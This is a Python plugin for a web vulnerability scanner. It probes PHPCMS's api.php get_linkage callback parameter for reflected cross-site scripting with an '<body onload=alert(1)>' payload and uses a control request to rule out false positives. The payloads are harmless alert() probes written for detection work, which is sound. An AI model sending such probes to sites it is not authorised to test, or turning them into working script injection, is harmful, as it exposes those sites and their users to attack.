#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        
        testurl="%s%s"%(url,"/abxaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaeada.php?a=<script>alert(32233333)</script>")
        url+="api.php?op=get_linkage&act=ajax_getlist&callback=<body onload=alert(1)>"
        r, c = requestUrl(http,testurl,ob['task_id'],ob['domain_id'])
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('onload=alert(1)')>=0 and res.has_key('content-type') and res['content-type'] != '' and c.find("abxaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaeada.php?a=<script>alert(32233333)</script>")<0:
            request = getRequest(url)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:phpcms_api.phpXSS.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:phpcms_api.phpXSS.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def